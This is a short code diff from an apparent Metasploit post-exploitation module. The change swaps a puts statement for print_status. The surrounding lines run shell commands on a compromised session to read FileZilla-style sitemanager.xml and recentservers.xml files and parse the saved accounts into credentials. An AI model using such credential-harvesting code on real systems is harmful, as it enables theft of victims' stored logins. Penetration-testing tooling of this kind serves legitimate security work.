@@ -166,7 +166,7 @@ class Metasploit3 < Msf::Post
 				type = :shell
 				sites = session.shell_command("cat #{path}/sitemanager.xml")
 				recents = session.shell_command("cat #{path}/recentservers.xml")
-				puts "recents: #{recents}"
+				print_status("recents: #{recents}")
 				creds = [parse_accounts(sites)]
 				creds << parse_accounts(recents) unless recents =~ /No such file/i
 			else
